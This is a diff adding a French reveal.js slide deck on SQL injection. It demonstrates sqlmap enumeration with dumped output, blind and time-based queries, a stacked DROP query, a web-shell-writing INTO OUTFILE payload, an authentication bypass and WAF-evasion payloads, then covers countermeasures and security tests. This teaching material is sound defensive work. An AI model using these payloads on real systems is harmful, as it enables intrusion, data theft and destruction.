@@ -1,0 +1,540 @@
+<!doctype html>
+<html lang="fr">
+
+	<head>
+		<meta charset="utf-8">
+
+		<title>Injections SQL - 1=1 est plus que jamais True</title>
+
+		<meta name="description" content="Présentation sur les injections sql">
+		<meta name="author" content="Lionel Chanson">
+
+		<meta name="apple-mobile-web-app-capable" content="yes" />
+		<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
+
+		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+		<link rel="stylesheet" href="css/reveal.min.css">
+		<link rel="stylesheet" href="css/theme/default.css" id="theme">
+
+		<!-- For syntax highlighting -->
+		<link rel="stylesheet" href="lib/css/zenburn.css">
+
+		<!-- If the query includes 'print-pdf', use the PDF print sheet -->
+		<script>
+			document.write( '<link rel="stylesheet" href="css/print/' + ( window.location.search.match( /print-pdf/gi ) ? 'pdf' : 'paper' ) + '.css" type="text/css" media="print">' );
+		</script>
+
+		<!--[if lt IE 9]>
+		<script src="lib/js/html5shiv.js"></script>
+		<![endif]-->
+	</head>
+
+	<body>
+
+		<div class="reveal">
+            <div class="slides">
+                <section>
+                    <h1>Injections SQL</h1>
+                    <h3>1=1 est plus que jamais True</h3>
+                </section>
+				<section>
+					<h2>Lionel Chanson</h2>
+                    <h4><small>( on va pas y passer la nuit )</small></h4>
+                    <p>
+                        Dans le web depuis plus de 10 ans. Je m'intéresse à la sécurité des applications web.
+					</p>
+				</section>
+                <section>
+                    <section>
+                        <h2>Constat</h2>
+                        <ul>
+                            <li>Les injections 1er au classement <a href="https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project">OWASP</a></li>
+                            <li><a href="https://github.com/search?p=100&q=extension%3Aphp+mysql_query+%24_GET&ref=searchresults&type=Code">
+                                Github Dorks</a> via <a href="https://twitter.com/Korben">@korben</a></li>
+                        </ul>
+                        <img src="image/github-dorks.jpg" />
+                    </section>
+                    <section>
+                        <p>OWASP : Open Web Application Security Project - <a href="https://www.owasp.org">www.owasp.org</a></p>
+                        <p><a href="http://www.exploit-db.com/google-dorks/">Google Dorks</a></p>
+                    </section>
+                </section>
+				<section>
+					<h2>Imaginez</h2>
+                        <h5>Le nombre de résultats sur</h5>
+                    <ul>
+                        <li>Python, Ruby, Rails, Java, .Net</li>
+                        <li>GET, POST, COOKIE, HEADER HTTP</li>
+                        <li>Mysql, MSSQL, Oracle, Postgres</li>
+                    </ul>
+				</section>
+				<section>
+					<h2>Combien de lignes de code avez-vous ?</h2>
+                    <ul>
+                        <li class="fragment">Dans les librairies tierces</li>
+                        <li class="fragment">Dans vos plugins Wordpress, Joomla, Drupal etc.</li>
+                        <li class="fragment">Dans vos plugins/bundles Symfony, Django, Rails etc.</li>
+                        <li class="fragment">Codées vous même ?</li>
+                    </ul>
+				</section>
+				<section>
+                    <h2>La vision à partir de l'attaque</h2>
+                    <p>En connaissant les techniques d'attaques on peut mettre en place des défenses.</p>
+				</section>
+
+				<section>
+					<h2>A l'attaque !</h2>
+                    <p>
+                        <a href="http://localhost:8000/" target="new">Démo</a>
+					</p>
+				</section>
+
+                <section>
+                    <section>
+					<h2>Les outils de pentest</h2>
+					<ul>
+						<li>Metasploit</li>
+						<li>SqlNinja</li>
+						<li>Kali linux</li>
+						<li>sqlmap</li>
+                    </ul>
+                    </section>
+                    <section>
+                        <a href="http://www.metasploit.com/">Metasploit</a>
+                        <p>Machine virtuelle pour s'entrainer <a href="https://community.rapid7.com/docs/DOC-1875">
+                            Metasploitable 2</a></p>
+                    </section>
+                    <section>
+                        <a href="http://sqlninja.sourceforge.net/">Sqlninja</a>
+                        <p>Outil pour faire des tests sur Microsoft SQL server.</p>
+                        <p><a href="http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-0232"> CVE-2010-0232</a>
+                        Permet d'utiliser xp_cmdshell() et de gagner des privilèges sur la machine</p>
+                    </section>
+                    <section>
+                        <a href="http://kali.org/">Kali Linux</a>
+                        <p>Distribution linux pour faire des pentest (BackTrack)</p>
+                    </section>
+				</section>
+
+                <section>
+                    <section>
+                        <h2>Sqlmap</h2>
+                        <pre>
+                            <code class="bash">
+    $ python sqlmap.py -u "http://localhost:8000/?id=1" -a
+                            </code>
+                        </pre>
+                        <p>La pire façon de faire un pentest !</p>
+    				</section>
+                    <section>
+                        <h2>Sqlmap fingerprinting</h2>
+                        <pre>
+                            <code class="bash">
+    $ python sqlmap.py -u "http://localhost:8000/?id=1" --banner
+    [..]
+    ---
+    [19:51:35] [INFO] the back-end DBMS is MySQL
+    [19:51:35] [INFO] fetching banner
+    web application technology: PHP 5.4.16
+    back-end DBMS: MySQL 5.0
+    banner:    '5.5.31-MariaDB'
+                            </code>
+                        </pre>
+                        </section>
+                   <section>
+                        <h2>Sqlmap enumeration</h2>
+                        <pre>
+                            <code class="bash">
+    $ python sqlmap.py -u "http://localhost:8000/?id=1" --tables -Dweb5 -Tuser --dump
+    [..]
+    [20:27:40] [INFO] fetching columns for table 'user' in database 'web5'
+    [20:27:41] [WARNING] reflective value(s) found and filtering out
+    [20:27:41] [INFO] fetching entries for table 'user' in database 'web5'
+    [20:27:41] [INFO] analyzing table dump for possible password hashes
+    [20:27:41] [INFO] recognized possible password hashes in column 'password'
+    [20:27:41] [INFO] writing hashes to file '/tmp/sqlmaphashes-g5Rh7R.txt' for eventual further processing with other tools
+
+    [20:27:47] [INFO] using hash method 'md5_generic_passwd'
+    what dictionary do you want to use?
+    [1] default dictionary file '/sqlmap-dev/txt/wordlist.zip' (press Enter)
+    [2] custom dictionary file
+    [3] file with list of dictionary files
+    > 1
+    [20:27:55] [INFO] using default dictionary
+    do you want to use common password suffixes? (slow!) [y/N] 
+    [20:27:58] [INFO] starting dictionary-based cracking (md5_generic_passwd)
+    [20:27:58] [INFO] starting 4 processes 
+    [20:28:16] [WARNING] no clear password(s) found                                                                                      
+    [20:28:16] [INFO] postprocessing table dump
+    Database: web5
+    Table: user
+    [1 entry]
+    +----+-------+----------------------------------+
+    | id | login | password                         |
+    +----+-------+----------------------------------+
+    | 1  | admin | 134562665af1fa4f74ef7c50d4452e8f |
+    +----+-------+----------------------------------+
+
+                            </code>
+                        </pre>
+                    </section>
+                </section>
+                <section>
+                    <h2>Les autres techniques d'injection</h2>
+               </section>
+               <section>
+                    <h2>Blind Sql Injection</h2>
+                    <p>On teste les injections sur des réponses TRUE et FALSE</p>
+                    <p>Pas de messages d'erreurs SQL</p>
+                    <p>Technique de devinette</p>
+                    <pre>
+                        <code class="sql">
+    SELECT id, title, content FROM article WHERE id = 1 and 
+    (
+        select if(substring(login,1,1) = 'a', 1, null) 
+        from user where id = 1
+    );#
+                        </code>
+                    </pre>
+				</section>
+               <section>
+                    <h2>Time Based</h2>
+                    <p>Variante de Blind</p>
+                    <p>C'est le temps de réponse qui indique si TRUE ou FALSE</p>
+                    <pre>
+                        <code class="sql">
+    SELECT id, title, content FROM article WHERE id = 1 and 
+    (
+        select if(substring(login,1,1) = 'a', SLEEP(5), null) 
+        from user where id = 1
+    );#
+                        </code>
+                    </pre>
+                </section>
+                <section>
+                    <h2>Stacked Queries</h2>
+                    <p>Ne fonctionne pas dans tous les cas :
+                    <a href="http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/#StackingQueries">
+                        Ferruh Mavituna</a></p>
+                    <pre>
+                        <code class="sql">
+    SELECT id, title, content FROM article; DROP user; 
+                        </code>
+                    </pre>
+				</section>
+                <section>
+                    <h2>Dump dans un fichier</h2>
+                    <p>Dump d'une base ou table</p>
+                    <p>Injection d'un fichier</p>
+                    <pre>
+                        <code class="sql">
+    SELECT id, title, content FROM article 
+        union select "&lt?php", "echo system($_GET['cmd']);", "?&gt" 
+        into outfile "/var/www/cmd.php"
+                        </code>
+                    </pre>
+                </section>
+                <section>
+                    <h2>Erreur de design de code</h2>
+                    <p>On peut outre passer un authentification</p>
+                    <pre>
+                        <code class="php">
+    $query = "SELECT * FROM user WHERE login = ".$_POST['login']." 
+        AND password = ".$_POST['password'];
+                        </code>
+                     </pre>
+                    <pre>
+                       <code class="sql">
+        //payload
+        login: admin,
+        password: " or 1=1;
+                        </code>
+                      </pre>
+                    <pre>
+                      <code class="sql">
+    SELECT * FROM user WHERE login = "admin" AND password = "" OR 1=1;
+                        </code>
+                    </pre>
+				</section>
+                <section>
+                    <h2>Contre mesures</h2>
+                </section>
+                <section>
+                    <h2>Prepare Statement</h2>
+                    <pre>
+                        <code class="php">
+    $stm = $pdo->prepare("select * from article where id = :id");
+    $stm->bindParam(":id", $_GET["id"])
+                        </code>
+                    </pre>
+                </section>
+                <section>
+                    <h2>Stored Procedure</h2>
+                    <pre>
+                        <code class="sql">
+    mysql> CREATE PROCEDURE simpleproc (IN article_id INT)
+        -> BEGIN
+        ->   SELECT * FROM ARTICLE WHERE id = article_id ;
+        -> END
+                        </code>
+                    </pre>
+                    <pre>
+                        <code class="php">
+    $stm = $pdo->prepare("call simpleproc(?)");
+    $stm->bindParam(1, $_GET["id"])
+                        </code>
+                    </pre>
+                </section>
+
+				<section>
+					<h2>Data Validation / Input Sanitization</h2>
+					<ul>
+                        <li>A utiliser si les autres solutions sont impossibles</li>
+                        <li>Important au niveau UX</li>
+                        <li>Efficace pour les attaques XSS</li>
+                        <li>Problématique de whitelist / blacklist</li>
+					</ul>
+                </section>
+                <section>
+                    <h2>Data Validation / Input Sanitization</h2>
+                    <p>C'est du code donc potentiellement vulnérable</p>
+                    <pre>
+                        <code class="php">
+    // Facile sur les nombres
+    $id = (int) $_GET['id']
+
+    // Complexe sur les chaines de caractères
+    $str = (string) $_GET['str'] ;-)
+                        </code>
+                    </pre>
+				</section>
+                <section>
+					<h2>Data Validation / Input Sanitization</h2>
+                    <pre>
+                        <code class="php">
+    //Enlève les espaces
+    $str = 'union select';
+    echo preg_replace('/\s+/', '',$str);
+
+    > unionselect
+                        </code>
+                    </pre>
+                    <pre>
+                        <code data-trim class="sql">
+    payload = 1/**/and/**/union/**/select/**/database()
+                        </code>
+                    </pre>
+                </section>
+                <section>
+                    <section>
+                        <h2>IDS : Intrusion Detection System</h2>
+                        <h6>( ou WAF : Web Application Firewall )</h6>
+                            <p><a href="https://www.modsecurity.org/">Modsecurity</a> des vulnérabilités connues et 
+                                corrigées. <br />Est-ce mis à jour ?</p>
+                        </pre>
+                        <pre>
+                            <code data-trim class="sql">
+    // supprime des mots clés.
+    payload = 1 unUNIONion selSELECTect database()
+
+    mod_security : 1 union select database()
+
+    // On lui fait plus.
+    payload : 1/*&foo=1*/union/*&bar=2*/select/*&plop=3*/database()
+
+    mod_security : id= 1, foo=1 union, bar=2 select, plop=3 database()
+
+    apps : 1 union select database()
+                            </code>
+                        </pre>
+                    </section>
+                    <section>
+                        <p>
+                            <a href="http://1337day.com/exploit/18109">Exemple de bypass</a> 
+                            de <a href="https://www.modsecurity.org/">Modsecurity</a> version 2.6.5
+                        </p>
+                    </section>
+                </section>
+                <section>
+                    <h2>Droit utilisateur sur la base</h2>
+                        <ul>
+                            <li>Frontend / Backend : même droits ?</li>
+                            <li>Droit sur les opérations File ?</li>
+                        </ul>
+                </section>
+                <section>
+					<h2>Cycle de vie</h2>
+				</section>
+                <section>
+                    <h2>Sécurisé en amont</h2>
+                    <ul>
+                        <li>Politique de sécurité</li>
+                        <li>Développez des use case</li>
+                        <li>Des tests d'acceptances</li>
+                        <li>Code review</li>
+                    </ul>
+				</section>
+                <section>
+                    <h2>Unit Tests</h2>
+                        <ul>
+                            <li class="fragment">Essentiel sur une app from scratch</li>
+                            <li class="fragment">Régression de sécurité</li>
+                            <li class="fragment">pentest dans le système d'intégration continue </li>
+                        </ul>
+                </section>
+                <section>
+                    <h2>Unit Tests</h2>
+                    <p>Ajoutez des tests de sécurité</p>
+                    <pre><code data-trim class="python">
+def test_get(self):
+    article = Article.get(pk=1)
+    self.assertEqual(article.title, 'I am insecure')
+
+def test_inject_id(self):
+    article = Article.get(pk=2-1)
+    self.assertNotIsInstance(article.id, Article)
+    self.assertNotEqual(article.id, 1)
+					</code></pre>
+				</section>
+                <section>
+                    <p>Scripter vos pentest</p>
+                    <pre><code data-trim class="python">
+def test_enum_database(self):
+    """ Test sql injection which enum database """
+    payload = {"id": "1 union select 1,database(),1%23"}
+    r = requests.get(url, params=payload)
+
+    title_selector = cssselect.CSSSelector('article h2 a')
+    html_doc = html.fromstring(r.text)
+
+    // test database in title
+    titles = title_selector(html_doc)
+    for title in titles:
+        self.assertNotEqual(title.text, 'web5', 
+            'Sql injection works !')
+
+					</code></pre>
+				</section>
+
+				<section>
+                    <h2>Scriptez vos pentest</h2>
+                    <ul>
+                        <li>Pour les rejouer plus facilement</li>
+                        <li>Pour tester la production</li>
+                    </ul>
+                </section>
+                <section>
+                    <h2>Conclusion</h2>
+                </section>
+				<section>
+                    <h2>Pas de chaines de caractères dynamiques</h2>
+                    <pre><code data-trim class="sql">
+                    SELECT * FROM tablename WHERE id = var
+                    </code></pre>
+                    <p>Même sur des prepare statement ou procédures stockées !</p>
+                </section>
+                <section>
+                    <h2>Pensez à la sécurité en amont</h2>
+                </section>
+                <section>
+                    <h3>Mettez vous dans la peau d'un attaquant.</h3>
+				</section>
+                <section>
+                    <h2>Testez !</h2>
+                    <h3>Unit Test, pentest</h3>
+				</section>
+                <section>
+                    <section>
+                        <h2>Entrainez-vous à l'attaque</h2>
+                    </section>
+                    <section>
+                        <h2>Pour s'entrainer</h2>
+                        <ul>
+                            <li><a href="http://www.root-me.org/">root-me.org</a></li>
+                            <li><a href="https://www.pentesterlab.com/">pentesterlab.com</a></li>
+                            <li><a href="http://www.dvwa.co.uk/">Damn Vulnerable Wep App</a></li>
+                            <li><a href="http://www.offensive-security.com/metasploit-unleashed/Main_Page">
+                                Metasploit unleashed</a></li>
+                        </ul>
+                    </section>
+                    <section>
+                        <h2>Liens</h2>
+                            <p>SQL Cheat Sheet : Michael Boman</p>
+                        <ul>
+                            <li><a href="http://www.michaelboman.org/books/sql-injection-cheat-sheet-db2">DB2</a></li>
+                            <li><a href="http://www.michaelboman.org/books/sql-injection-cheat-sheet-informix">Informix</a></li>
+                            <li><a href="http://www.michaelboman.org/books/sql-injection-cheat-sheet-ingres">Ingres</a></li>
+                            <li><a href="http://www.michaelboman.org/books/sql-injection-cheat-sheet-mysql">Mysql</a></li>
+                            <li><a href="http://www.michaelboman.org/books/sql-injection-cheat-sheet-mssql">Mssql</a></li>
+                            <li><a href="http://www.michaelboman.org/books/sql-injection-cheat-sheet-oracle">Oracle</a></li>
+                            <li><a href="http://www.michaelboman.org/books/sql-injection-cheat-sheet-postgresql">Postgres</a></li>
+                        </ul>
+                    </section>
+                    <section>
+                        <p>Ferruh Mavituna :<a href="http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/">SQL Cheat Sheet</a>
+                        <p>Yasser Aboukir<a href="SQL Injection through HTTP Headers">SQL Injection through HTTP Headers</a></p>
+                        </p>
+                        <p>Johannes Dahse</p>
+                        <ul>
+                            <li><a href="http://websec.wordpress.com/2010/12/04/sqli-filter-evasion-cheat-sheet-mysql/">
+                                Sqli filter evasion</a></li>
+                            <li><a href="http://websec.files.wordpress.com/2010/11/sqli2.pdf">SQLi filter evasion and obfuscation</a></li>
+                            <li><a href="http://websec.wordpress.com/2010/03/19/exploiting-hard-filtered-sql-injections/">Exploiting Hard Filtered SQL Injections</a></li>
+                            <li><a href="http://websec.wordpress.com/2010/03/19/exploiting-hard-filtered-sql-injections-2-conditional-errors/">Exploiting Hard Filtered SQL Injections Part 2</a></li>
+                            <li><a href="http://websec.wordpress.com/2010/03/19/exploiting-hard-filtered-sql-injections-3/">Exploiting Hard Filtered SQL Injections Part 3</a></li>
+                        </ul>
+                    </section>
+                    <section>
+                        <h2>Owasp</h2>
+                        <ul>
+                            <li><a href="https://www.owasp.org/">OWASP</a></li>
+                            <li><a href="https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project">Top 10</a></li>
+                            <li><a href="https://www.owasp.org/index.php/Top_10_2013-A1-Injection">SQL Injection</a></li>
+                            <li><a href="https://www.owasp.org/index.php/Web_Application_Penetration_Testing">Web App Pentest Guide</a></li>
+                            <li><a href="https://www.owasp.org/index.php/Category:OWASP_Guide_Project">Development guide</a></li>
+
+                    </section>
+				</section>
+				<section>
+                    <h1>Questions ?</h1>
+                    <a href="https://www.twitter.com/liochan">@liochan</a>
+				</section>
+
+			</div>
+
+		</div>
+
+		<script src="lib/js/head.min.js"></script>
+		<script src="js/reveal.min.js"></script>
+
+		<script>
+
+			// Full list of configuration options available here:
+			// https://github.com/hakimel/reveal.js#configuration
+			Reveal.initialize({
+				controls: true,
+				progress: true,
+				history: true,
+				center: true,
+
+				theme: Reveal.getQueryHash().theme, // available themes are in /css/theme
+				transition: Reveal.getQueryHash().transition || 'default', // default/cube/page/concave/zoom/linear/fade/none
+
+				// Optional libraries used to extend on reveal.js
+				dependencies: [
+					{ src: 'lib/js/classList.js', condition: function() { return !document.body.classList; } },
+					{ src: 'plugin/markdown/marked.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },
+					{ src: 'plugin/markdown/markdown.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },
+					{ src: 'plugin/highlight/highlight.js', async: true, callback: function() { hljs.initHighlightingOnLoad(); } },
+					{ src: 'plugin/zoom-js/zoom.js', async: true, condition: function() { return !!document.body.classList; } },
+					{ src: 'plugin/notes/notes.js', async: true, condition: function() { return !!document.body.classList; } }
+					// { src: 'plugin/search/search.js', async: true, condition: function() { return !!document.body.classList; } }
+					// { src: 'plugin/remotes/remotes.js', async: true, condition: function() { return !!document.body.classList; } }
+				]
+			});
+
+		</script>
+
+	</body>
+</html>
